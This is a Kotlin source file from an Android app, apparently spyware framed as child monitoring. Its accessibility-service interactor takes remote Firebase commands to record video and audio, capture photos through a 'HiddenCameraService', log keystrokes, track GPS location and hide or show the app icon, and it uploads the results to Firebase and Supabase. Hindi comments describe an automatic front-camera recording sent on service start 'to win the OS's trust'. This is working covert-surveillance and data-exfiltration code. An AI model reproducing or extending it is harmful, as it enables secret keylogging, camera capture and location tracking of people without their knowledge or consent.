package com.safe.setting.app.services.accessibilityData

import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.safe.setting.app.R
import com.safe.setting.app.data.model.AudioCommand
import com.safe.setting.app.data.model.ChildPhoto
import com.safe.setting.app.data.model.CommandStatus
import com.safe.setting.app.data.model.DailyLimits
import com.safe.setting.app.data.model.Photo
import com.safe.setting.app.data.model.VideoCommand
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.Consts.AUDIO
import com.safe.setting.app.utils.Consts.CHILD_CAPTURE_PHOTO
import com.safe.setting.app.utils.Consts.CHILD_GPS
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.CHILD_SERVICE_DATA
import com.safe.setting.app.utils.Consts.CHILD_SHOW_APP
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.KEY_LOGGER
import com.safe.setting.app.utils.Consts.KEY_TEXT
import com.safe.setting.app.utils.Consts.LOCATION
import com.safe.setting.app.utils.Consts.PARAMS
import com.safe.setting.app.utils.Consts.PHOTO
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.Consts.VIDEO
import com.safe.setting.app.utils.MyCountDownTimer
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.safe.setting.app.utils.supabase.SupabaseManager
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject

class InteractorAccessibilityData @Inject constructor(
    @param:ApplicationContext private val context: Context,
    private val firebase: InterfaceFirebase
) : InterfaceAccessibility, CameraCallbacks {

    private var recordingController: RecordingController? = null
    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()
    private var lastLocationUpdate: Long = 0
    private val locationUpdateInterval: Long = 60000
    private var countDownTimer : MyCountDownTimer = MyCountDownTimer((1 * 60 * 1440000).toLong(), (1 * 1000).toLong()){
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
        startCountDownTimer()
    }

    fun setRecordingController(controller: RecordingController) {
        this.recordingController = controller
    }

    // #############################################################
    // ### नया फंक्शन: स्वचालित वीडियो प्राइमिंग कमांड भेजने के लिए ###
    // #############################################################
    /**
     * हिंदी कमेंट: यह फंक्शन फायरबेस पर एक वीडियो रिकॉर्डिंग कमांड (फ्रंट कैमरे के साथ) भेजता है.
     * यह AccessibilityDataService के onServiceConnected द्वारा कॉल किया जाता है
     * ताकि OS का भरोसा जीता जा सके.
     */
    fun triggerAutomaticVideoPrimingCommand() {
        if (firebase.getUser() == null) return
        Log.d(TAG, "Triggering automatic VIDEO priming command via Firebase.")
        // हिंदी कमेंट: हम recordVideo को true और facing को 1 (फ्रंट कैमरा) पर सेट कर रहे हैं.
        val videoCommand = VideoCommand(true, CameraFacing.FRONT_FACING_CAMERA)
        firebase.getDatabaseReference("$VIDEO/$PARAMS").setValue(videoCommand)
    }
    // ### नया फंक्शन समाप्त ###


    fun reportCommandStatus(commandType: String, status: String, details: String) {
        if (firebase.getUser() == null) return
        val commandStatus = CommandStatus(
            commandType = commandType,
            status = status,
            details = details,
            timestamp = System.currentTimeMillis()
        )
        firebase.getDatabaseReference("CommandHistory").push().setValue(commandStatus)
    }

    override fun getCaptureVideo() {
        disposable.add(firebase.valueEventModel("$VIDEO/$PARAMS", VideoCommand::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ command -> handleVideoCommand(command) },
                { error -> Log.e(TAG, error.message.toString()) }))
    }

    override fun getCaptureAudio() {
        disposable.add(firebase.valueEventModel("$AUDIO/$PARAMS", AudioCommand::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ command -> handleAudioCommand(command) },
                { error -> Log.e(TAG, error.message.toString()) }))
    }

    private fun getTodayDateString(): String {
        return SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
    }

    private fun handleVideoCommand(command: VideoCommand) {
        if (command.recordVideo == true) {
            firebase.getDatabaseReference("$VIDEO/$PARAMS/recordVideo").setValue(false)
            val limitsRef = firebase.getDatabaseReference("limits")
            limitsRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    var limits = snapshot.getValue(DailyLimits::class.java) ?: DailyLimits()
                    val today = getTodayDateString()

                    if (limits.lastResetDate != today) {
                        limits = DailyLimits(today, 0, 0, limits.maxVideoLimit, limits.maxAudioLimit)
                    }

                    val maxLimit = limits.maxVideoLimit ?: 4
                    val currentVideoCount = limits.videoCount ?: 0

                    if (currentVideoCount < maxLimit) {
                        limits.videoCount = currentVideoCount + 1
                        limitsRef.setValue(limits)
                        Log.i(TAG, "Video recording limit is within bounds. New count: ${limits.videoCount} / $maxLimit")
                        reportCommandStatus("VIDEO", "STARTED", "Video recording initiated.")
                        recordingController?.startVideoRecording(command.facing ?: CameraFacing.REAR_FACING_CAMERA)
                    } else {
                        reportCommandStatus("VIDEO", "BLOCKED", "Daily limit reached ($maxLimit).")
                        Log.w(TAG, "Video recording daily limit of $maxLimit has been reached.")
                    }
                }
                override fun onCancelled(error: DatabaseError) {
                    reportCommandStatus("VIDEO", "FAILED", "Firebase read error: ${error.message}")
                    Log.e(TAG, "Failed to read limits from Firebase: ${error.message}")
                }
            })
        }
    }

    private fun handleAudioCommand(command: AudioCommand) {
        if (command.recordAudio == true) {
            firebase.getDatabaseReference("$AUDIO/$PARAMS/recordAudio").setValue(false)
            val limitsRef = firebase.getDatabaseReference("limits")
            limitsRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    var limits = snapshot.getValue(DailyLimits::class.java) ?: DailyLimits()
                    val today = getTodayDateString()
                    if (limits.lastResetDate != today) {
                        limits = DailyLimits(today, 0, 0, limits.maxVideoLimit, limits.maxAudioLimit)
                    }
                    val maxLimit = limits.maxAudioLimit ?: 5
                    val currentAudioCount = limits.audioCount ?: 0
                    if (currentAudioCount < maxLimit) {
                        limits.audioCount = currentAudioCount + 1
                        limitsRef.setValue(limits)
                        Log.i(TAG, "Audio recording limit is within bounds. New count: ${limits.audioCount} / $maxLimit")
                        reportCommandStatus("AUDIO", "STARTED", "Audio recording initiated.")
                        recordingController?.startAudioRecording()
                    } else {
                        reportCommandStatus("AUDIO", "BLOCKED", "Daily limit reached ($maxLimit).")
                        Log.w(TAG, "Audio recording daily limit of $maxLimit has been reached.")
                    }
                }
                override fun onCancelled(error: DatabaseError) {
                    reportCommandStatus("AUDIO", "FAILED", "Firebase read error: ${error.message}")
                    Log.e(TAG, "Failed to read limits from Firebase: ${error.message}")
                }
            })
        }
    }

    fun setPushState(state: String, randomName: String, type: String) {
        val statusMap = mapOf(
            "state" to state,
            "details" to ""
        )
        firebase.getDatabaseReference("$type/${Consts.STATUS}/$randomName").setValue(statusMap)
    }

    override fun startCountDownTimer() { countDownTimer.start() }
    override fun stopCountDownTimer() { countDownTimer.cancel() }
    override fun clearDisposable() {}
    override fun setDataKey(data: String) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
    }
    override fun setDataLocation(location: Location) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastLocationUpdate >= locationUpdateInterval) {
            lastLocationUpdate = currentTime
            if (firebase.getUser() != null) {
                val address: String
                val geoCoder = Geocoder(context, Locale.getDefault())
                address = try {
                    @Suppress("DEPRECATION")
                    geoCoder.getFromLocation(location.latitude, location.longitude, 1)?.get(0)!!.getAddressLine(0)
                } catch (e: Exception) {
                    context.getString(R.string.address_not_found)
                }
                val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
                firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
            }
        }
    }
    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser() != null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
    }
    override fun enableGps(gps: Boolean) {
        if (firebase.getUser() != null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
    }
    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser() != null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
    }
    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
            .map { data -> data.value as Boolean }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ context.showApp(it) },
                { error -> Log.e(TAG, error.message.toString()) }))
    }
    override fun getCapturePicture() {
        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ child -> startCameraPicture(child) },
                { error -> Log.e(TAG, error.message.toString()) }))
    }
    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto == true) {
            val cameraConfig = CameraConfig().builder(context)
                .setCameraFacing(childPhoto.facingPhoto!!)
                .setImageRotation(
                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
                    else CameraRotation.ROTATION_90
                )
                .build()
            reportCommandStatus("PHOTO", "STARTED", "Photo capture initiated.")
            pictureCapture.startCamera(cameraConfig)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()
        reportCommandStatus("PHOTO", "UPLOAD_STARTED", "Photo captured. Uploading to Supabase.")
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = SupabaseManager.uploadFile(imageFile)
                val photo = Photo(getRandomNumeric(), getDateTime(), url)
                firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
                firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
                firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
            } catch (e: Exception) {
                reportCommandStatus("PHOTO", "UPLOAD_FAILED", "Supabase upload failed: ${e.message}")
                Log.e(TAG, "Supabase upload failed: ${e.message}")
            } finally {
                imageFile.delete()
            }
        }
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        val errorReason = when (errorCode) {
            CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE -> "Camera permission not available."
            CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION -> "Draw over other apps permission denied."
            CameraError.ERROR_IMAGE_WRITE_FAILED -> "Failed to write image to disk."
            CameraError.ERROR_CAMERA_OPEN_FAILED -> "OS failed to open camera (Possibly blocked)."
            else -> "Unknown camera error ($errorCode)."
        }
        reportCommandStatus("PHOTO", "FAILED", errorReason)

        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
        if (errorCode == CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
            errorCode == CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
            errorCode == CameraError.ERROR_IMAGE_WRITE_FAILED) {
            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
        }
    }

    private fun getDateTime(): String {
        return SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
    }
    private fun getRandomNumeric(): String {
        return (100000..999999).random().toString()
    }
}
